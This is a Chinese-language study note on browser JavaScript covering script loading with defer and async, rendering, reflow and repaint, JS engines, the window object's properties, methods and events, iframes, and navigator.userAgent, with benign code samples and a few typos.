<p>脚本执行原理：</p>
<ul>
<li>浏览器下载HTML，下载并开始解析</li>
<li>遇到JS代码，停止HTML解析；开始JS解析；如果是外部JS代码，需要下载完毕后解析JS。如果下载时间较长，会产生阻塞。所以通常把JS脚本放在页面底部。如果在头部加载，DOM没有渲染，可能JS出错</li>
<li>解析JS完毕后，继续解析HTML界面</li>
</ul>
<p>浏览器对于同一个域名下的资源数量有限制，为了避免服务器请求过多；如果资源很多，可以放在不同的域名下。</p>
<h4 id="defer">defer 属性<a class="headerlink" href="#defer" title="Permanent link">&para;</a></h4>
<p>外部的脚本，如果添加了defer属性，就会在HTML下载解析结束后再执行这个脚本。浏览器解析HTML和下载脚本过程是并行的，这样会避免阻塞。</p>
<h4 id="async">async 属性<a class="headerlink" href="#async" title="Permanent link">&para;</a></h4>
<p>浏览器遇到async属性的脚本，会使用另一个进程下载脚本，下载过程中不会造成阻塞。下载JS任务和解析HTML是并行的。当脚本下载完毕，暂停DOM渲染，执行JS脚本。执行完毕后，继续界面的DOM渲染。注意：如果多脚本异步下载，先下载的脚本会先执行。</p>
<p>defer 和 async 使用：如果脚本间有较强的依赖性（babel react）需要使用defer（设置async属性是false），如果脚本间没有依赖性，可以使用 async。</p>
<h4 id="_2">加载协议<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>默认协议是HTTP协议，可以在Scr属性中设置其他协议下载，或者根据界面自身的协议下载。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://test.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;//example.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>

<h4 id="_3">浏览器组成<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<p>浏览器有DOM渲染引擎和JS解释器（JS引擎）组成</p>
<p><strong>渲染引擎</strong>：Firefox：Gecko；Safari：WebKit ；Chrome：Blink ；IE: Trident ；Edge: EdgeHTML</p>
<p><strong>渲染引擎工作流程</strong>：HTML解析成DOM，CSS解析成CSSOM（object model），将这两部分合成渲染树（render tree），计算渲染树的布局（layout），将渲染树绘制到屏幕。这几部分不是完全先后执行的，可能一部分已经渲染，另一部分HTML还在下载</p>
<h4 id="_4">重绘和重流<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p><strong>布局（布局流，flow）和绘制（paint）</strong>：渲染树转化成网页布局（layout）的过程叫布局，网页布局（layout）转化成屏幕显示叫绘制。这两部分会阻塞并且消耗性能。</p>
<p><strong>重绘和重流</strong>：页面首次生成后，操作脚本和样式表会造成界面的重流或重绘。重流必然造成重绘，重绘不会造成重流。如果改变文字颜色，页面的布局不会改，所以不会重流，只会重绘。如果改变文本内容，界面布局会改变，会重流重绘。浏览器会对比改变前后的渲染树的差别，计算出变化的部分diff，不会重新加载整个网页，只渲染一部分子树。开发中尽量减少重流和重绘，尽量不要改变顶层的DOM节点，table布局和flex布局会消耗性能。</p>
<h4 id="_5">性能优化<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。使用<code>documentFragment</code>操作 DOM，使用虚拟 DOM（virtual DOM）库。缓存 DOM 信息。</p>
</li>
<li>
<p>不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。动画使用<code>absolute</code>定位或<code>fixed</code>定位，这样可以减少对其他元素的影响。只在必要时才显示隐藏元素。</p>
</li>
<li>
<p>使用<code>window.requestAnimationFrame()</code>，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流。</p>
</li>
</ul>
<p>~~~js
  function doubleHeight(ele) {
    let currentHeight = ele.clientHeight;
    window.requestAnimationFrame(() =&gt; {
      // 可以把代码所有的写操作几种到一起，这样会减少DOM变动的开销，重绘代价少
      ele.style.height = (currentHeight * 2) + 'px';
    });
  }</p>
<p>elements.forEach(doubleHeight);
  ~~~</p>
<h4 id="js"><strong>JS 引擎</strong><a class="headerlink" href="#js" title="Permanent link">&para;</a></h4>
<p>JS是解析型语言。早期浏览器内部对 JavaScript 的处理过程如下：</p>
<ol>
<li>读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。</li>
<li>对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。</li>
<li>使用“翻译器”（translator），将代码转为字节码（bytecode）。</li>
<li>使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。</li>
</ol>
<p>逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。</p>
<p>字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)">Chakra</a> (Microsoft Internet Explorer)</li>
<li><a href="http://en.wikipedia.org/wiki/WebKit#JavaScriptCore">Nitro/JavaScript Core</a> (Safari)</li>
<li><a href="http://dev.opera.com/articles/view/labs-carakan/">Carakan</a> (Opera)</li>
<li><a href="https://developer.mozilla.org/en-US/docs/SpiderMonkey">SpiderMonkey</a> (Firefox)</li>
<li><a href="https://en.wikipedia.org/wiki/Chrome_V8">V8</a> (Chrome, Chromium)</li>
</ul>
<h3 id="102-window">10.2 window 对象<a class="headerlink" href="#102-window" title="Permanent link">&para;</a></h3>
<p>window对象和JS中普通对象类似，具有属性和方法，也会触发事件。</p>
<p>window对象是当前浏览器窗口的顶层对象。如果一个没有声明的变量直接使用，就会自动转化成顶层对象的属性（window的属性）。</p>
<h4 id="_6">属性<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
<p><strong>常规属性</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="nx">表示当前浏览器窗口的名字</span><span class="err">（</span><span class="nx">字符串</span><span class="err">，</span><span class="nx">容量可以高达几MB</span><span class="err">）；</span><span class="nx">只要浏览器窗口不关闭</span><span class="err">，</span><span class="nx">跳转另一个页面</span><span class="err">（</span><span class="nx">或者刷新当前窗口</span><span class="err">），</span><span class="nx">前一个浏览器窗口名字设置不会变化</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">closed</span> <span class="nx">判断窗口是否关闭</span><span class="p">(</span><span class="nx">可以监测使用脚本打开的新窗口是否关闭</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span> <span class="nx">属性表示打开当前窗口的父窗口</span> <span class="nx">如果没有父窗口</span><span class="err">，</span><span class="nx">就返回</span> <span class="kc">null</span><span class="err">。</span><span class="nx">如果两个窗口不需要通信</span><span class="err">，</span><span class="nx">就设置子窗口</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span> <span class="o">===</span> <span class="kc">null</span> <span class="nx">这样可以切断父窗口的联系</span><span class="err">。</span><span class="o">&lt;</span><span class="nx">a</span><span class="o">&gt;</span><span class="nx">元素添加rel</span><span class="o">=</span><span class="s2">&quot;noopener&quot;</span><span class="nx">属性</span><span class="err">，</span><span class="nx">可以防止新打开的窗口获取父窗口</span><span class="err">，</span><span class="nx">减轻被恶意网站修改父窗口</span> <span class="nx">URL</span> <span class="nx">的风险</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">self</span> 
<span class="nb">window</span><span class="p">.</span><span class="nb">window</span> <span class="nx">指向本身</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">status</span> <span class="nx">读取浏览器状态栏的文本</span><span class="p">(</span><span class="nx">兼容早期浏览器</span><span class="p">)</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://an.evil.site&quot;</span> <span class="na">target</span><span class="o">=</span><span class="s">&quot;_blank&quot;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;noopener&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>

<p><strong>框架的属性</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">frames</span> <span class="nx">返回当前页面内所有的框架窗口</span><span class="p">(</span><span class="nx">伪数组</span><span class="p">)</span> <span class="nx">包括frame</span> <span class="nx">iframe</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">length</span> <span class="nx">返回框架窗口的数量</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">frameElement</span> <span class="nx">如果一个窗口被嵌入另一个窗口</span><span class="err">，</span><span class="nx">这个属性返回原始的父窗口</span><span class="err">。</span><span class="nx">如果当前窗口是顶层窗口</span><span class="err">，</span><span class="nx">或者和父窗口不是同源的</span><span class="err">，</span><span class="nx">那么返回值是null</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">top</span> <span class="nx">执行顶层窗口</span><span class="err">。</span><span class="nx">主要用于框架窗口中获取顶层窗口</span><span class="err">，</span><span class="nx">如果没有框架</span><span class="err">，</span><span class="nx">返回window</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">parent</span> <span class="nx">返回父窗口</span><span class="err">；</span><span class="nx">如果没有父窗口</span><span class="err">，</span><span class="nx">返回自身</span>
</code></pre></div>

<p><strong>高清屏幕的属性</strong></p>
<p>window.devicePixelRatio 返回显示像素和物理像素的比值：如果比例较大，说明处于高清屏幕(当前是2)</p>
<p><strong>位置属性</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">screenX</span> <span class="nx">screenY</span> <span class="nx">浏览器左上角相对于屏幕的位置</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="nx">浏览器视口的尺寸</span><span class="p">(</span><span class="nx">包括滚动条</span><span class="p">)</span><span class="nx">如果界面变成200</span><span class="o">%</span><span class="err">，</span> <span class="nx">那么视口会变小</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">outerHeight</span> <span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span> <span class="nx">浏览器窗口的尺寸</span><span class="p">(</span><span class="nx">包括菜单栏和border</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">scrollX</span> <span class="nx">scrollY</span> 
</code></pre></div>

<p>组件属性：获取浏览器的组件对象（状态栏地址栏工具栏等）</p>
<p>全局对象属性：document/location/navigator/history/localStorage/sessionStorage/console/screen</p>
<p>window.isSecureContext 返回是否处于加密状态（https）</p>
<h4 id="_7">方法<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">confirm</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">prompt</span><span class="p">()</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">windowName</span><span class="p">,</span> <span class="nx">windowFeature</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span> <span class="nx">关闭当前的窗口</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">stop</span><span class="p">()</span> <span class="nx">停止当前窗口的加载</span><span class="p">(</span><span class="nx">等价于浏览器停止按钮</span><span class="p">)</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="nx">第二个参数</span><span class="err">：</span><span class="nx">windowName</span><span class="err">：</span><span class="nx">字符串</span><span class="err">，</span><span class="nx">表示新窗口的名字</span><span class="err">。</span><span class="nx">如果该名字的窗口已经存在</span><span class="err">，</span><span class="nx">则占用该窗口</span><span class="err">，</span><span class="nx">不再新建窗口</span><span class="err">。</span><span class="nx">如果省略</span><span class="err">，</span><span class="nx">就默认使用_blank</span><span class="err">，</span><span class="nx">表示新建一个没有名字的窗口</span><span class="err">。</span><span class="nx">另外还有几个预设值</span><span class="err">，</span><span class="nx">_self表示当前窗口</span><span class="err">，</span><span class="nx">_top表示顶层窗口</span><span class="err">，</span><span class="nx">_parent表示上一层窗口</span><span class="err">。</span>

<span class="nx">open</span><span class="p">()</span><span class="nx">方法的第二个参数虽然可以指定已经存在的窗口</span><span class="err">，</span><span class="nx">但是不等于可以任意控制其他窗口</span><span class="err">。</span><span class="nx">为了防止被不相干的窗口控制</span><span class="err">，</span><span class="nx">浏览器只有在两个窗口同源</span><span class="err">，</span><span class="nx">或者目标窗口被当前网页打开的情况下</span><span class="err">，</span><span class="nx">才允许open方法指向该窗口</span><span class="err">。</span><span class="nx">如果新窗口和父窗口不是同源的</span><span class="err">（</span><span class="nx">即不在同一个域</span><span class="err">），</span><span class="nx">它们彼此不能获取对方窗口对象的内部属性</span><span class="err">。</span>

<span class="nx">第三个参数表示新打开窗口的属性</span><span class="err">，</span><span class="nx">是一个字符串</span><span class="p">(</span><span class="nx">array</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)),</span><span class="nx">属性见</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//wangdoc.com/javascript/bom/window.html</span>

<span class="kd">var</span> <span class="nx">popup</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span>
  <span class="s1">&#39;somepage.html&#39;</span><span class="p">,</span>
  <span class="s1">&#39;DefinitionsWindows&#39;</span><span class="p">,</span>
  <span class="s1">&#39;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#39;</span>
<span class="p">);</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">moveBy</span><span class="p">()</span>
<span class="nx">把当前窗口移动到某个坐标</span><span class="err">，</span><span class="nx">或者移动某个位移</span><span class="err">，</span><span class="nx">这个窗口必须是新建的窗口</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">resizeTo</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">availWidth</span> <span class="o">/</span> <span class="mf">2</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">availHeight</span> <span class="o">/</span> <span class="mf">2</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">resizeBy</span><span class="p">(</span><span class="o">-</span><span class="mf">100</span><span class="p">,</span> <span class="o">-</span><span class="mf">200</span><span class="p">)</span>
<span class="nx">当前窗口缩放到某个尺寸</span><span class="p">(</span><span class="nx">屏幕的一半</span><span class="p">)</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">scrollTo</span> <span class="nb">window</span><span class="p">.</span><span class="nx">scrollBy</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">print</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span> <span class="nb">window</span><span class="p">.</span><span class="nx">blur</span><span class="p">()</span> <span class="nx">通常打开一个新窗口并获得焦点</span><span class="p">(</span><span class="nx">显示在页面最前面</span><span class="p">)</span>

<span class="kd">let</span> <span class="nx">selectionObj</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">();</span>
<span class="kd">let</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">selectionObj</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">getComputedStyle</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">matchMedia</span><span class="p">()</span>
</code></pre></div>

<p><strong>window.requestAminationFrame()</strong></p>
<p>这个方法类似于 setTimeout 会推迟函数到浏览器下一次重流时执行，执行完才会进行下一次重绘，这个函数没有设定时间，浏览器可以根据设备的速度调节执行的时间。如果函数改变网页的布局，可以使用这个方法，这样可以节省系统资源，使得网页效果更加平滑。</p>
<p>window.requestAnimationFrame(callback) 回调函数可以获取一个时间戳，表示距离网页加载的时间</p>
<p><code>window.requestAnimationFrame()</code>的返回值是一个整数，这个整数可以传入window.cancelAnimationFrame()，用来取消回调函数的执行。下面是一个界面动画</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">element</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;animate&#39;</span><span class="p">);</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="s1">&#39;absolute&#39;</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">step</span><span class="p">(</span><span class="nx">timestamp</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">start</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">start</span> <span class="o">=</span> <span class="nx">timestamp</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kd">var</span> <span class="nx">progress</span> <span class="o">=</span> <span class="nx">timestamp</span> <span class="o">-</span> <span class="nx">start</span><span class="p">;</span>
  <span class="c1">// 元素不断向左移，最大不超过200像素</span>
  <span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">progress</span> <span class="o">/</span> <span class="mf">10</span><span class="p">,</span> <span class="mf">200</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;px&#39;</span><span class="p">;</span>
  <span class="c1">// 如果距离第一次执行不超过 2000 毫秒，</span>
  <span class="c1">// 就继续执行动画</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">progress</span> <span class="o">&lt;</span> <span class="mf">2000</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">step</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">step</span><span class="p">);</span>
</code></pre></div>

<p><strong>window.requestIdleCallback()</strong></p>
<p><code>window.requestIdleCallback()</code>跟<code>setTimeout</code>类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用<code>window.requestIdleCallback()</code>将其推迟执行，以保证网页性能。</p>
<p>它跟<code>window.requestAnimationFrame()</code>的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；<code>window.requestIdleCallback()</code>可以保证回调函数在系统资源空闲时执行。</p>
<p>该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空虚，都会执行。</p>
<div class="codehilite"><pre><span></span><code>window.requestIdleCallback(callback[, options])
</code></pre></div>

<p><code>callback</code>参数是一个回调函数。该回调函数执行时，系统会传入一个<code>IdleDeadline</code>对象作为参数。<code>IdleDeadline</code>对象有一个<code>didTimeout</code>属性（布尔值，表示是否为超时调用）和一个<code>timeRemaining()</code>方法（返回该空闲时段剩余的毫秒数）。</p>
<p><code>options</code>参数是一个配置对象，目前只有<code>timeout</code>一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。</p>
<p><code>window.requestIdleCallback()</code>方法返回一个整数。该整数可以传入<code>window.cancelIdleCallback()</code>取消回调函数。</p>
<p>下面是一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">requestIdleCallback</span><span class="p">(</span><span class="nx">myNonEssentialWork</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">myNonEssentialWork</span><span class="p">(</span><span class="nx">deadline</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">while</span> <span class="p">(</span><span class="nx">deadline</span><span class="p">.</span><span class="nx">timeRemaining</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">doWorkIfNeeded</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码中，<code>requestIdleCallback()</code>用来执行非关键任务<code>myNonEssentialWork</code>。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。</p>
<p>下面是指定<code>timeout</code>的例子。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">requestIdleCallback</span><span class="p">(</span><span class="nx">processPendingAnalyticsEvents</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mf">2000</span> <span class="p">});</span>
</code></pre></div>

<p>上面代码指定，<code>processPendingAnalyticsEvents</code>必须在未来2秒之内执行。</p>
<p>如果由于超时导致回调函数执行，则<code>deadline.timeRemaining()</code>返回<code>0</code>，<code>deadline.didTimeout</code>返回<code>true</code>。</p>
<p>如果多次执行<code>window.requestIdleCallback()</code>，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。 </p>
<h4 id="_8">事件<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">//</span>
<span class="p">}</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">filename</span><span class="p">,</span> <span class="nx">lineno</span><span class="p">,</span> <span class="nx">colno</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// JS脚本错误会触发onerror</span>
<span class="p">}</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onafterprint</span><span class="err">：</span><span class="nx">afterprint事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onbeforeprint</span><span class="err">：</span><span class="nx">beforeprint事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onbeforeunload</span><span class="err">：</span><span class="nx">beforeunload事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onhashchange</span><span class="err">：</span><span class="nx">hashchange事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onlanguagechange</span><span class="o">:</span> <span class="nx">languagechange的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span><span class="err">：</span><span class="nx">message事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onmessageerror</span><span class="err">：</span><span class="nx">MessageError事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onoffline</span><span class="err">：</span><span class="nx">offline事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">ononline</span><span class="err">：</span><span class="nx">online事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onpagehide</span><span class="err">：</span><span class="nx">pagehide事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onpageshow</span><span class="err">：</span><span class="nx">pageshow事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onpopstate</span><span class="err">：</span><span class="nx">popstate事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onstorage</span><span class="err">：</span><span class="nx">storage事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onunhandledrejection</span><span class="err">：</span><span class="nx">未处理的</span> <span class="nb">Promise</span> <span class="nx">对象的reject事件的监听函数</span><span class="err">。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onunload</span><span class="err">：</span><span class="nx">unload事件的监听函数</span><span class="err">。</span>
</code></pre></div>

<h4 id="_9">多窗口操作<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
<p>一个网页可以使用iframe嵌入其他网页，这样一个界面会嵌套多层网页（这个技术现在过时了）。</p>
<p>通过下面的属性判断是否是顶层窗口：window.top window.parent window.self </p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">top</span> <span class="o">===</span> <span class="nb">window</span><span class="p">.</span><span class="nx">self</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// 当前窗口是顶层窗口</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;somepage.html&quot;</span> <span class="na">target</span><span class="o">=</span><span class="s">&quot;_top&quot;</span><span class="p">&gt;</span>Link<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> 表示在顶层窗口打开链接
</code></pre></div>

<p><strong>iframe 元素</strong></p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementBuId</span><span class="p">(</span><span class="s1">&#39;#frame&#39;</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">innerWindow</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">innerDocument</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">contemtDocument</span><span class="p">;</span>
<span class="nx">innerWindow</span><span class="p">.</span><span class="nx">frameElement</span> <span class="o">===</span> <span class="nx">iframe</span>
<span class="c1">// 获取子窗口的window对象</span>

<span class="c1">// 如果在同源的情况下，可以获取内部window的属性</span>
<span class="nx">innerWindow</span><span class="p">.</span><span class="nx">title</span>
</code></pre></div>

<p>如果父窗口和子窗口处于同源时，两个窗口间可以直接通信</p>
<p>window.frames 可以获取当前窗口中全部子窗口的伪数组</p>
<h3 id="103-navigator">10.3 Navigator<a class="headerlink" href="#103-navigator" title="Permanent link">&para;</a></h3>
<p>Navigator 这个对象可以反映用户浏览器和系统信息</p>
<div class="codehilite"><pre><span></span><code><span class="nx">Navigator</span><span class="p">.</span><span class="nx">userAgent</span> <span class="c1">// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot; 获取浏览器的厂商和基本信息。以前通过这个属性获取用户浏览器名称来处理兼容性。现在由于PC端版本复杂，一般不使用了。现在通过功能识别的方式，获取浏览器信息。可以通过这个属性判断手机浏览器和PC端大类</span>

<span class="kd">var</span> <span class="nx">ua</span> <span class="o">=</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="sr">/mobi/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">ua</span><span class="p">))</span> <span class="p">{</span>
  <span class="c1">// 手机浏览器</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="c1">// 非手机浏览器</span>
<span class="p">}</span>

<span class="sr">/mobi|android|touch|mini/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">ua</span><span class="p">)</span>

<span class="nx">Navigator</span><span class="p">.</span><span class="nx">plugins</span> <span class="nx">返回一个伪数组</span><span class="err">，</span><span class="nx">是浏览器的插件</span><span class="p">(</span><span class="nx">flash</span><span class="p">)</span>
<span class="nx">Navigator</span><span class="p">.</span><span class="nx">platform</span> <span class="nx">用户操作系统</span> <span class="s2">&quot;Linux x86_64&quot;</span> <span class="nx">但是自己测试不生效</span>
<span class="nx">Navigator</span><span class="p">.</span><span class="nx">onLine</span> <span class="nx">返回用户在线或者离线</span> <span class="nx">如果是false</span><span class="err">，</span><span class="nx">肯定离线</span><span class="err">；</span><span class="nx">如果是true</span><span class="err">，</span><span class="nx">可能用户所在局域网也是离线的</span><span class="err">，</span><span class="nx">可以通过事件监听获取用户在线情况</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;offline&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;offline&#39;</span><span class="p">);</span> <span class="p">});</span>
